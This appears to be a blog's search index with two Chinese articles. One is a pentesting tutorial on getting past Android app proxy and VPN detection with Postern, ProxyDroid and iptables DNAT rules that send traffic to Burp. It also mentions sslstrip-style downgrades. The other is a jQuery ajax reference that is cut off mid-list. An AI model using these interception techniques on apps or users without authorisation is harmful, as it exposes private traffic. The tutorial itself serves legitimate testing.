<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>APP代理检测对抗</title>
    <url>/articles/APP%E4%BB%A3%E7%90%86%E6%A3%80%E6%B5%8B%E5%AF%B9%E6%8A%97/</url>
    <content><![CDATA[<h2 id="1-前言"><a href="#1-前言" class="headerlink" title="1.前言"></a>1.前言</h2><p>本文将从网络通信原理浅析在android中出现的一些代理转发检测，这些功能会使我们测试app时出现<strong>抓不到包</strong>或者<strong>应用闪退</strong>等情况，针对这种场景，我搭建了测试环境，并对其场景展开分析与实施应对方案。</p>
<h2 id="2-OSI-7层网络模型"><a href="#2-OSI-7层网络模型" class="headerlink" title="2.OSI 7层网络模型"></a>2.OSI 7层网络模型</h2><p>网络通信嘛，首先得知道什么是OSI 7层模型。下面是百度的解释：</p>
<blockquote>
<p>为了使不同计算机厂家生产的计算机能够相互通信，以便在更大的范围内建立计算机网络，国际标准化组织（ISO）在1978年提出了“开放系统互联参考模型”，即著名的OSI/RM模型（Open System Interconnection/Reference Model）。</p>
<p>它将计算机网络体系结构的通信协议划分为七层，自下而上依次为：</p>
<p><a href="https://baike.baidu.com/item/物理层" target="_blank" rel="noopener">物理层</a>（Physics Layer）、<a href="https://baike.baidu.com/item/数据链路层" target="_blank" rel="noopener">数据链路层</a>（Data Link Layer）、<a href="https://baike.baidu.com/item/网络层/4329439" target="_blank" rel="noopener">网络层</a>（Network Layer）、<a href="https://baike.baidu.com/item/传输层" target="_blank" rel="noopener">传输层</a>（Transport Layer）、<a href="https://baike.baidu.com/item/会话层" target="_blank" rel="noopener">会话层</a>（Session Layer）、<a href="https://baike.baidu.com/item/表示层" target="_blank" rel="noopener">表示层</a>（Presentation Layer）、<a href="https://baike.baidu.com/item/应用层/16412033" target="_blank" rel="noopener">应用层</a>（Application Layer）</p>
</blockquote>
<p>使用网络数据的传输离不开网络协议七层模型，通过理解每一层协议的分工，也就能对网络故障逐一排查，这样的思维逻辑在安卓应用中也同样适用。</p>
<p><strong>OSI 7层模型</strong>各层功能及对应的协议、设备如下表所示：</p>
<table>
<thead>
<tr>
<th align="left">OSI对应的层</th>
<th align="left">功能</th>
<th align="left">TCP/IP对应的协议</th>
<th align="left">设备</th>
</tr>
</thead>
<tbody><tr>
<td align="left">应用层</td>
<td align="left">文件传输，电子邮件，文件服务，虚拟终端</td>
<td align="left">TFTP，HTTP，SNMP，FTP，SMTP，DNS，Telnet</td>
<td align="left">/</td>
</tr>
<tr>
<td align="left">表示层</td>
<td align="left">数据格式化，代码转换，数据加密</td>
<td align="left">/</td>
<td align="left">/</td>
</tr>
<tr>
<td align="left">会话层</td>
<td align="left">解除或建立与别的接点的联系</td>
<td align="left">/</td>
<td align="left">/</td>
</tr>
<tr>
<td align="left">传输层</td>
<td align="left">提供端对端的接口</td>
<td align="left">TCP，UDP</td>
<td align="left">四层交换机和四层路由</td>
</tr>
<tr>
<td align="left">网络层</td>
<td align="left">为数据包选择路由</td>
<td align="left">IP，ICMP，RIP，OSPF，BGP，IGMP</td>
<td align="left">三层交换机和路由</td>
</tr>
<tr>
<td align="left">数据链路层</td>
<td align="left">传输有地址的帧以及错误检测功能</td>
<td align="left">ARP，RARP，MTU，SLIP，CSLIP，PPP</td>
<td align="left">网桥、交换机、网卡</td>
</tr>
<tr>
<td align="left">物理层</td>
<td align="left">以二进制数据形式在物理媒体上传输数据</td>
<td align="left">ISO2110，IEEE802，IEEE802.2</td>
<td align="left">中继器、集线器、双绞线</td>
</tr>
</tbody></table>
<p>知识点：HTTPS协议是<code>HTTP+SSL</code></p>
<p>根据上表可知，SSL做数据加密是在表示层，也就是说，HTTPS实际上是建立在SSL之上的HTTP协议，而普通的HTTP协议是建立在TCP协议之上的。所以，当HTTPS访问URL时，由于URL在网络传送过程中最后是处于HTTP协议数据报头中，而HTTP协议位于SSL的上层，所以凡是HTTP协议所负责传输的数据就全部被加密了；但是IP地址并没加密，因为处理IP地址的协议（网络层）位于处理SSL协议（表示层）的下方。</p>
<p>额，说了这么多，就是要告诉你一个重要的关键点：数据的封装是<code>自下而上</code>的 ！在网络数据处理方面，如果是上层做了检测处理，则需要在同层或下层进行逻辑绕过，这就是攻与防的关键了，偷家（底层）才是硬道理。</p>
<p>接下来，我们再理解一下代理与VPN。</p>
<h2 id="3-代理与VPN"><a href="#3-代理与VPN" class="headerlink" title="3.代理与VPN"></a>3.代理与VPN</h2><h3 id="3-1、代理"><a href="#3-1、代理" class="headerlink" title="3.1、代理"></a>3.1、代理</h3><p><strong>代理（proxy）</strong> 也称网络代理，是一种特殊的网络服务，允许一个终端（一般为客户端）通过这个服务与另外一个终端（一般为服务器）进行非直接的连接。</p>
<p>一个<code>完整的代理请求过程</code>为：客户端首先根据代理服务器所使用的<strong>代理协议</strong>，与<strong>代理服务器</strong>创建连接，接着按照协议请求对目标服务器创建连接、或者获得目标服务器的指定资源。</p>
<h3 id="3-2、VPN"><a href="#3-2、VPN" class="headerlink" title="3.2、VPN"></a>3.2、VPN</h3><p><strong>VPN</strong>（virtual private network）（<strong>虚拟专用网络</strong> ）是常用于连接中、大型企业或团体间私人网络的通讯方法。它利用<strong>隧道协议（Tunneling Protocol）</strong>来达到发送端认证、消息保密与准确性等功能。</p>
<h3 id="3-3、代理和VPN的区别"><a href="#3-3、代理和VPN的区别" class="headerlink" title="3.3、代理和VPN的区别"></a>3.3、代理和VPN的区别</h3><p>从各自的定义，我们就能看出VPN的特点是采取<strong>隧道协议</strong>进行数据传输和保护；而代理使用的则是对应的<strong>代理协议</strong>。</p>
<p>下面是VPN和代理的常用协议：</p>
<table>
<thead>
<tr>
<th align="left"></th>
<th align="left">协议名称</th>
</tr>
</thead>
<tbody><tr>
<td align="left">VPN</td>
<td align="left">OpvenVPN、IPsec、IKEv2、PPTP、L2TP、WireGuard等</td>
</tr>
<tr>
<td align="left">代理</td>
<td align="left">HTTP、HTTPS、SOCKS、FTP、RTSP等</td>
</tr>
</tbody></table>
<p>VPN 协议大多是作用在 OSI 的第二层和第三层之间，所以使用 VPN 时，几乎能转发所有的流量。</p>
<p>而代理协议多作用在应用层，最高层。</p>
<h2 id="4-安卓代理检测"><a href="#4-安卓代理检测" class="headerlink" title="4.安卓代理检测"></a>4.安卓代理检测</h2><p>知道了代理与VPN的作用后，在APP中，如果开发人员在代码中添加了一些网络层的检测机制，而这些机制恰恰又是针对工作层协议进行的检测，那么只要分析出工作在IOS的哪一层，抢先一步在下层做出应对，那APP在上层无论怎么检测，都没有用。下面将对测试场景进行详细分析。</p>
<p>抓包的步骤：</p>
<p>1.在客户端（手机）中设置代理服务器的地址</p>
<p>2.开启代理服务器（burp）的代理功能</p>
<p>如果在客户端对代理服务进行过滤，禁止客户端通过代理服务器进行访问Internet，添加如下代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">connection = (HttpURLConnection) url.openConnection(Proxy.NO_PROXY);</span><br></pre></td></tr></table></figure>

<p>官方对于<strong>Proxy.NO_PROXY</strong>的描述如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"> * A proxy setting that represents a &#123;<span class="meta">@code</span> DIRECT&#125; connection,</span><br><span class="line"> * basically telling the protocol handler not to use any proxying.</span><br><span class="line"> * Used, <span class="keyword">for</span> instance, to create sockets bypassing any other global</span><br><span class="line"> * <span class="function">proxy <span class="title">settings</span> <span class="params">(like SOCKS)</span>:</span></span><br><span class="line"><span class="function"> * &lt;P&gt;</span></span><br><span class="line"><span class="function"> * </span>&#123;<span class="meta">@code</span> Socket s = <span class="keyword">new</span> Socket(Proxy.NO_PROXY);&#125;</span><br><span class="line"> *</span><br><span class="line"> */<span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">static</span> Proxy NO_PROXY = <span class="keyword">new</span> Proxy();</span><br><span class="line"></span><br><span class="line"><span class="comment">// Creates the proxy that represents a &#123;@code DIRECT&#125; connection.private Proxy() &#123;</span></span><br><span class="line">    type = Type.DIRECT;</span><br><span class="line">    sa = <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>NO_PROXY</strong>实际上就是type属性为<strong>DIRECT</strong>的一个Proxy对象，这个type有三种：</p>
<ul>
<li>DIRECT</li>
<li>HTTP</li>
<li>SOCKS</li>
</ul>
<p>所以，Proxy.NO_PROXY的意思是connection的请求是<strong>直连</strong>。</p>
<p>此时若通过系统进行代理，app对外请求会失效，也就是视觉上看到的卡死状态，就是不让走系统代理。</p>
<p>安卓手机上设置<strong>系统代理</strong>即是在【设置】-【WLAN】-【修改网络】手动设置代理。</p>
<p><strong>针对不走系统代理的情况有如下两种应对：</strong></p>
<p>1、使用基于<code>VPN</code>模式的<code>Postern</code></p>
<p>2、使用基于<code>iptables</code>的<code>ProxyDroid</code></p>
<p>对此，我做出了如下一些测试：</p>
<h3 id="4-1、使用系统代理"><a href="#4-1、使用系统代理" class="headerlink" title="4.1、使用系统代理"></a>4.1、使用系统代理</h3><p>APP关键代码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">sendRequestWithHttpURLConnection</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">new</span> Thread(<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            HttpURLConnection connection = <span class="keyword">null</span>;</span><br><span class="line">            BufferedReader reader = <span class="keyword">null</span>;</span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                URL url = <span class="keyword">new</span> URL(<span class="string">"http://www.baidu.com"</span>);</span><br><span class="line">                connection = (HttpURLConnection) url.openConnection(Proxy.NO_PROXY);</span><br><span class="line">                connection.setRequestMethod(<span class="string">"GET"</span>);</span><br><span class="line">                InputStream in = connection.getInputStream();</span><br><span class="line"></span><br><span class="line">                reader = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(in));</span><br><span class="line">                StringBuilder response = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">                String line;</span><br><span class="line">                <span class="keyword">while</span> ((line = reader.readLine()) != <span class="keyword">null</span>)&#123;</span><br><span class="line">                    response.append(line);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                showResponse(response.toString());</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (reader != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        reader.close();</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (IOException e)&#123;</span><br><span class="line">                        e.printStackTrace();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (connection != <span class="keyword">null</span>)&#123;</span><br><span class="line">                    connection.disconnect();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;).start();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>针对<strong>Proxy.NO_PROXY</strong>，先测试一下，系统代理是否真的不能抓包。</p>
<p>如下图先设置系统代理，burp监听8888，此时打开APP，点击发送请求无任何反应，burp中也抓不到包，说明系统代理被禁了。</p>
<p><img src="/articles/APP代理检测对抗/20220512144301.png" alt></p>
<p><img src="/articles/APP代理检测对抗/20220512162425.png" alt></p>
<h3 id="4-2、使用Postern代理"><a href="#4-2、使用Postern代理" class="headerlink" title="4.2、使用Postern代理"></a>4.2、使用Postern代理</h3><p>用过这款软件的都知道，当开启代理服务后状态栏会有个<code>钥匙</code>的标志，这可能也是基于VPN模式工作的特征</p>
<p><img src="/articles/APP代理检测对抗/20220512162635.png" alt></p>
<p>同样的APP，点击请求，此时成功绕过了Proxy.NO_PROXY检测！也说明了VPN协议在HTTP协议的下层。</p>
<p><img src="/articles/APP代理检测对抗/20220512163122.png" alt></p>
<h2 id="5-安卓VPN检测"><a href="#5-安卓VPN检测" class="headerlink" title="5.安卓VPN检测"></a>5.安卓VPN检测</h2><p>VPN也是代理的一种，但是由于通讯协议的差异，所以检测代码也不一样。</p>
<p>当客户端运行<code>VPN虚拟隧道协议</code>时，会在当前节点<code>创建</code>基于eth之上的<code>tun0</code>接口或<code>ppp0</code>接口，所以一旦出现带有明显特征的网络接口名称，就可以认定是使用了VPN协议进行通信。</p>
<p>下面这段代码的检测方式：出现特征<strong>tun0</strong>或者<strong>ppp0</strong>则退出应用，也就是我们看到的闪退效果。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">isDeviceInVPN</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        Enumeration&lt;NetworkInterface&gt; networkInterfaces = NetworkInterface.getNetworkInterfaces();</span><br><span class="line">        <span class="keyword">while</span> (networkInterfaces.hasMoreElements()) &#123;</span><br><span class="line">            String name = networkInterfaces.nextElement().getName();</span><br><span class="line">            <span class="keyword">if</span> (name.equals(<span class="string">"tun0"</span>) || name.equals(<span class="string">"ppp0"</span>)) &#123;</span><br><span class="line">                stop();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (SocketException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在点击监听中放置isDeviceInVPN()功能，点击即触发，如果检测到了使用了VPN则直接退出。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View view)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (view.getId() == R.id.send_request)&#123;</span><br><span class="line">        isDeviceInVPN();</span><br><span class="line">        sendRequestWithHttpURLConnection();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="5-1、使用ProxyDroid代理"><a href="#5-1、使用ProxyDroid代理" class="headerlink" title="5.1、使用ProxyDroid代理"></a>5.1、使用ProxyDroid代理</h3><p>当前场景：APP同时开启了代理检测以及VPN检测</p>
<p>这时使用<strong>iptables</strong>进行数据转发的软件 <strong>ProxyDroid</strong> 进行测试，配置如下图所示：</p>
<p><img src="/articles/APP代理检测对抗/20220512164343.png" alt></p>
<p>开启之后，系统状态栏不会出现钥匙的形状，这时再次进行抓包测试。</p>
<p><img src="/articles/APP代理检测对抗/20220512164629.png" alt></p>
<p>burp成功获取到了请求，至此代理与VPN的应对方法均已实现。所以，<strong>iptables</strong> 竟然能从OSI的 2、3层下面走吗，下面我们继续分析。</p>
<h2 id="6-iptables原理"><a href="#6-iptables原理" class="headerlink" title="6.iptables原理"></a>6.iptables原理</h2><p>我们都知道安卓使用的是linux内核，而linux内核提供的防火墙工具是<strong>Netfilter/Iptables</strong>。</p>
<p><strong>Netfilter</strong>是由linux内核集成的IP数据包过滤系统，其工作在内核内部，而<strong>Iptables</strong>则是让用户定义规则集的表结构。</p>
<p>也就是，<strong>iptables</strong>是一个命令行工具，位于用户空间，它真正操作的框架实现在<strong>内核</strong>当中。</p>
<blockquote>
<p>Netfilter是一个数据包处理模块，它具有<code>网络地址转换</code>、<code>数据包内容修改</code>、<code>数据包过滤</code>等功能。 要使netfilter能够工作，就需要将所有的规则读入内存中。netfilter自己维护一个内存块，在此内存块中有4个表：filter表、NAT表、mangle表和raw表。在每个表中有相应的链，链中存放的是一条条的规则，规则就是过滤防火的语句或者其他功能的语句。也就是说表是链的容器，链是规则的容器。实际上，每个链都只是一个hook函数（钩子函数）而已。</p>
</blockquote>
<p><strong>Iptables</strong>主要工作在OSI七层的2.3.4层，好像也没比VPN的工作协议低，反而还有高的，但是测试结果证明，是我想错了，iptables不是由于协议低，而是没有出现<strong>tun0</strong>或者<strong>ppp0</strong>这两个关键的网卡特征，所以成功绕过了VPN的检测。</p>
<p>基于iptables这个流量转发，我还发现了一个新的名词，叫做“<code>透明代理</code>”，iptables的转发模式就是这种。</p>
<p>由此，延伸了一个新的代理模式，通过burp进行“透明代理”，网上的教程错综复杂，亲测使用过程如下。</p>
<h2 id="7-透明代理"><a href="#7-透明代理" class="headerlink" title="7.透明代理"></a>7.透明代理</h2><ul>
<li>原理：透明代理技术可以让客户端<code>感觉不到代理的存在</code>，用户不需要在浏览器中设置任何代理，只需设置缺省网关即可。在访问外部网络时，客户端的数据包被发送到缺省网关，通过缺省网关的路由，最终到达代理服务器，最后代理服务器运行代理进程，数据实际被重定向到代理服务器的代理端口，即由本地代理服务器向外请求所需数据然后拷贝给客户端。</li>
</ul>
<p>接下来我将尝试：结合安卓端的透明代理技术与burp存在的invisible模式</p>
<h3 id="7-1、使用Burp透明代理"><a href="#7-1、使用Burp透明代理" class="headerlink" title="7.1、使用Burp透明代理"></a>7.1、使用Burp透明代理</h3><p><strong>（1）安卓端设置</strong></p>
<p>首先在设备上手动进行设置：将所以请求80、443端口的tcp流量进行nat转发到192.168.50.177（burp的监听地址）的对应端口上</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">adb shell</span><br><span class="line">su</span><br><span class="line">iptables -t nat -A OUTPUT -p tcp --dport 80 -j DNAT --to  192.168.50.177:80</span><br><span class="line">iptables -t nat -A OUTPUT -p tcp --dport 443 -j DNAT --to  192.168.50.177:443</span><br></pre></td></tr></table></figure>

<p>查看当前规则是否成功添加</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">iptables -t nat -L</span><br></pre></td></tr></table></figure>

<p><img src="/articles/APP代理检测对抗/20220512174024.png" alt></p>
<p><strong>（2）代理服务器端设置</strong></p>
<p>添加80和443的端口监听</p>
<p>在【Binding】中设置端口，选中 【All interfaces】</p>
<p><img src="/articles/APP代理检测对抗/20220511155619.png" alt></p>
<p>并对【Request handing】做出如下设置</p>
<p><img src="/articles/APP代理检测对抗/20220511155224.png" alt></p>
<p><img src="/articles/APP代理检测对抗/20220511155347.png" alt></p>
<blockquote>
<p><strong>Redirect to port</strong> - 如果配置了这个选项，Burp会在每次请求转发到指定的端口，而不必受限于浏览器所请求的目标。</p>
<p><strong>Force use of SSL</strong> - 如果配置了这个选项，Burp会使用HTTPS在所有向外的连接，即使传入的请求中使用普通的HTTP。您可以使用此选项，在与SSL相关的响应修改选项结合，开展sslstrip般的攻击使用Burp，其中，强制执行HTTPS的应用程序可以降级为普通的HTTP的受害用户的流量在不知不觉中通过BurpProxy代理。</p>
</blockquote>
<p>设置之后，Proxy状态如下</p>
<p><img src="/articles/APP代理检测对抗/20220511155443.png" alt></p>
<p>此时burp就可对转发到这里的80和443端口的流量进行<strong>透明代理</strong></p>
<blockquote>
<p>注意：如果出现443端口被占用，查找进程kill掉即可。</p>
<p><img src="/articles/APP代理检测对抗/image-20220511154711616.png" alt></p>
<p><img src="/articles/APP代理检测对抗/image-20220511154455104.png" alt></p>
<p>以管理员身份运行 cmd 执行如下代码</p>
<p><img src="/articles/APP代理检测对抗/image-20220511154419965.png" alt></p>
</blockquote>
<p>经过测试，burp成功抓取到了请求包。</p>
<p><strong>这里不禁思考，如果是基于iptables进行的数据转发，那么刚才的ProxyDroid是否也内置了一些路由规则呢？</strong></p>
<p>查看一下开启ProxyDroid时iptables当下的规则</p>
<p><img src="/articles/APP代理检测对抗/20220512175635.png" alt></p>
<p>从图中可以看到共有六条策略，其中最后两条就是我们刚才手动添加的，但并没有看到burp监听的8888端口，8123、8124一定是软件内置的代理转发端口，想要知道具体原理还需要详细分析ProxyDroid的源码。</p>
<p><strong>血泪避坑</strong>：网上出现了很多教程，最关键的iptables规则写法不一，导致多次测试结果并不成功，如果将安卓终端的80和443端口同时转发到burp上监听的唯一一个端口则会出现连接错误。根据burp官方文档说明为每个端口号设置监听器会更加稳定，也就是要设置两个代理监听。</p>
<h2 id="8-总结"><a href="#8-总结" class="headerlink" title="8.总结"></a>8.总结</h2><p>根据不同的代码检测，也会有不同的应对方法，所以，遇到APP出现抓包闪退等问题，先逆向，查看源码，在通信处仔细进行分析，再针对检测代码进行绕过，才是正解。本文提到的并不是固定的处理方法，如果文章有叙述不当，尽请矫正。</p>
<h2 id="9-参考链接"><a href="#9-参考链接" class="headerlink" title="9.参考链接"></a>9.参考链接</h2><p><a href="https://portswigger.net/burp/documentation/desktop/tools/proxy/options/invisible" target="_blank" rel="noopener">burp invisible官方文档</a></p>
<p><a href="https://mp.weixin.qq.com/s/u4WwEGFADvRIYFudrMDsRQ" target="_blank" rel="noopener">代理与VPN</a></p>
<p><a href="https://cloud.tencent.com/developer/article/1619659" target="_blank" rel="noopener">iptables的内核原理</a></p>
]]></content>
      <categories>
        <category>安全研究</category>
      </categories>
  </entry>
  <entry>
    <title>Ajax使用详解</title>
    <url>/articles/Ajax%E4%BD%BF%E7%94%A8%E8%AF%A6%E8%A7%A3/</url>
    <content><![CDATA[<p>jQuery使用详解</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">$.ajax(&#123;</span><br><span class="line"></span><br><span class="line">    type: <span class="string">"POST"</span>, <span class="comment">// 请求方式</span></span><br><span class="line"></span><br><span class="line">    contentType: <span class="string">"application/x-www-form-urlencoded"</span>, <span class="comment">// Body编码</span></span><br><span class="line"></span><br><span class="line">    dataType: <span class="string">"html"</span>,<span class="comment">// 预期服务器返回的数据类型</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">async</span>: <span class="literal">true</span>,<span class="comment">// 异步请求，同步的话改成false</span></span><br><span class="line"></span><br><span class="line">    url: <span class="string">"http://www.*****.com"</span>, <span class="comment">// 请求地址</span></span><br><span class="line"></span><br><span class="line">    timeout:<span class="number">30000</span>, <span class="comment">// 超时</span></span><br><span class="line"></span><br><span class="line">    success: <span class="function">(<span class="params">data</span>) =&gt;</span> &#123; <span class="comment">// 请求成功</span></span><br><span class="line">        alert(data);</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    error: <span class="function">(<span class="params">XMLHttpRequest, textStatus, errorThrown</span>) =&gt;</span> &#123; <span class="comment">// 请求失败</span></span><br><span class="line">        alert(errorThrown);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    complete:  <span class="function">(<span class="params">XMLHttpRequest, ts</span>) =&gt;</span> &#123; <span class="comment">// 请求完成（不管成功还是失败）</span></span><br><span class="line">        alert(ts);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>参数</p>
<p><strong>options</strong></p>
<p>类型：Object</p>
<p>可选。AJAX 请求设置。所有选项都是可选的。</p>
<p><strong>async</strong></p>
<p>类型：Boolean</p>
<p>默认值: true。默认设置下，所有请求均为异步请求。如果需要发送同步请求，请将此选项设置为 false。</p>
<p>注意，同步请求将锁住浏览器，用户其它操作必须等待请求完成才可以执行。</p>
<p><strong>beforeSend(XHR)</strong></p>
<p>类型：Function</p>
<p>发送请求前可修改 XMLHttpRequest 对象的函数，如添加自定义 HTTP 头。</p>
<p>XMLHttpRequest 对象是唯一的参数。</p>
<p>这是一个 Ajax 事件。如果返回 false 可以取消本次 ajax 请求。</p>
<p><strong>cache</strong></p>
<p>类型：Boolean</p>
<p>默认值: true，dataType 为 script 和 jsonp 时默认为 false。设置为 false 将不缓存此页面。</p>
<p>jQuery 1.2 新功能。</p>
<p><strong>complete(XHR, TS)</strong></p>
<p>类型：Function</p>
<p>请求完成后回调函数 (请求成功或失败之后均调用)。</p>
<p>参数： XMLHttpRequest 对象和一个描述请求类型的字符串。</p>
<p>这是一个 Ajax 事件。</p>
<p><strong>contentType</strong></p>
<p>类型：String</p>
<p>默认值: “application/x-www-form-urlencoded”。发送信息至服务器时内容编码类型。</p>
<p>默认值适合大多数情况。如果你明确地传递了一个 content-type 给 $.ajax() 那么它必定会发送给服务器（即使没有数据要发送）。</p>
<p><strong>context</strong></p>
<p>类型：Object</p>
<p>这个对象用于设置 Ajax 相关回调函数的上下文。也就是说，让回调函数内 this 指向这个对象（如果不设定这个参数，那么 this 就指向调用本次 AJAX 请求时传递的 options 参数）。比如指定一个 DOM 元素作为 context 参数，这样就设置了 success 回调函数的上下文为这个 DOM 元素。</p>
<p>就像这样：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">$.ajax(&#123; <span class="attr">url</span>: <span class="string">"test.html"</span>, <span class="attr">context</span>: <span class="built_in">document</span>.body, <span class="attr">success</span>: <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    $(<span class="keyword">this</span>).addClass(<span class="string">"done"</span>);</span><br><span class="line">&#125;&#125;);</span><br></pre></td></tr></table></figure>

<p><strong>data</strong></p>
<p>类型：String</p>
<p>发送到服务器的数据。将自动转换为请求字符串格式。GET 请求中将附加在 URL 后。查看 processData 选项说明以禁止此自动转换。必须为 Key/Value 格式。如果为数组，jQuery 将自动为不同值对应同一个名称。如 {foo:[“bar1”, “bar2”]} 转换为 ‘&amp;foo=bar1&amp;foo=bar2’。</p>
<p><strong>dataFilter</strong></p>
<p>类型：Function</p>
<p>给 Ajax 返回的原始数据的进行预处理的函数。提供 data 和 type 两个参数：data 是 Ajax 返回的原始数据，type 是调用 jQuery.ajax 时提供的 dataType 参数。函数返回的值将由 jQuery 进一步处理。</p>
<p><strong>dataType</strong></p>
<p>类型：String</p>
<p>预期服务器返回的数据类型。如果不指定，jQuery 将自动根据 HTTP 包 MIME 信息来智能判断，比如 XML MIME 类型就被识别为 XML。在 1.4 中，JSON 就会生成一个 JavaScript 对象，而 script 则会执行这个脚本。随后服务器端返回的数据会根据这个值解析后，传递给回调函数。可用值:</p>
<ul>
<li><p>xml: 返回 XML 文档，可用 jQuery 处理。</p>
</li>
<li><p>html: 返回纯文本 HTML 信息；包含的 script 标签会在插入 dom 时执行。</p>
</li>
<li><p>script: 返回纯文本 JavaScript 代码。不会自动缓存结果。除非设置了 “cache” 参数。注意：在远程请求时(不在同一个域下)，所有POST 请求都将转为 GET 请求。（因为将使用 DOM 的 script标签来加载）</p>
</li>
<li><p>json: 返回 JSON 数据 。</p>
</li>
<li><p>jsonp: JSONP 格式。使用 JSONP 形式调用函数时，如 “myurl?callback=?” jQuery 将自动替换 ? 为正确的函数名，以执行回调函数。</p>
</li>
<li><p>text: 返回纯文本字符串</p>
</li>
</ul>
<p><strong>error</strong></p>
<p>类型：Function</p>
<p>默认值: 自动判断 (xml 或 html)。请求失败时调用此函数。</p>
<p>有以下三个参数：XMLHttpRequest 对象、错误信息、（可选）捕获的异常对象。</p>
<p>如果发生了错误，错误信息（第二个参数）除了得到 null 之外，还可能是 “timeout”, “error”, “notmodified” 和 “parsererror”。这是一个 Ajax 事件。</p>
<p><strong>global</strong></p>
<p>类型：Boolean</p>
<p>是否触发全局 AJAX 事件。默认值: true。设置为 false 将不会触发全局 AJAX 事件，如 ajaxStart 或 ajaxStop 可用于控制不同的 Ajax 事件。</p>
<p><strong>ifModified</strong></p>
<p>类型：Boolean</p>
<p>仅在服务器数据改变时获取新数据。默认值: false。使用 HTTP 包 Last-Modified 头信息判断。在 jQuery 1.4 中，它也会检查服务器指定的 ‘etag’ 来确定数据没有被修改过。</p>
<p><strong>jsonp</strong></p>
<p>类型：String</p>
<p>在一个 jsonp 请求中重写回调函数的名字。这个值用来替代在 “callback=?” 这种 GET 或 POST 请求中 URL 参数里的 “callback” 部分，比如 {jsonp:’onJsonPLoad’} 会导致将 “onJsonPLoad=?” 传给服务器。</p>
<p><strong>jsonpCallback</strong></p>
<p>类型：String</p>
<p>为 jsonp 请求指定一个回调函数名。这个值将用来取代 jQuery 自动生成的随机函数名。这主要用来让 jQuery 生成度独特的函数名，这样管理请求更容易，也能方便地提供回调函数和错误处理。你也可以在想让浏览器缓存 GET 请求的时候，指定这个回调函数名。</p>
<p><strong>password</strong></p>
<p>类型：String</p>
<p>用于响应 HTTP 访问认证请求的密码</p>
<p><strong>processData</strong></p>
<p>类型：Boolean</p>
<p>默认值: true。默认情况下，通过data选项传递进来的数据，如果是一个对象(技术上讲只要不是字符串)，都会处理转化成一个查询字符串，以配合默认内容类型 “application/x-www-form-urlencoded”。如果要发送 DOM 树信息或其它不希望转换的信息，请设置为 false。</p>
<p><strong>scriptCharset</strong></p>
<p>类型：String</p>
<p>只有当请求时 dataType 为 “jsonp” 或 “script”，并且 type 是 “GET” 才会用于强制修改 charset。通常只在本地和远程的内容编码不同时使用。</p>
<p><strong>success</strong></p>
<p>类型：Function</p>
<p>请求成功后的回调函数。</p>
<p>参数：由服务器返回，并根据 dataType 参数进行处理后的数据；描述状态的字符串。</p>
<p>这是一个 Ajax 事件。</p>
<p><strong>traditional</strong></p>
<p>类型：Boolean</p>
<p>如果你想要用传统的方式来序列化数据，那么就设置为 true。请参考工具分类下面的 jQuery.param 方法。</p>
<p><strong>timeout</strong></p>
<p>类型：Number</p>
<p>设置请求超时时间（毫秒）。此设置将覆盖全局设置。</p>
<p><strong>type</strong></p>
<p>类型：String</p>
<p>默认值: GET。请求方式 (“POST” 或 “GET”)， 默认为 “GET”。注意：其它 HTTP 请求方法，如 PUT 和 DELETE 也可以使用，但仅部分浏览器支持。</p>
<p><strong>url</strong></p>
<p>类型：String</p>
<p>默认值: 当前页地址。发送请求的地址。</p>
<p><strong>username</strong></p>
<p>类型：String</p>
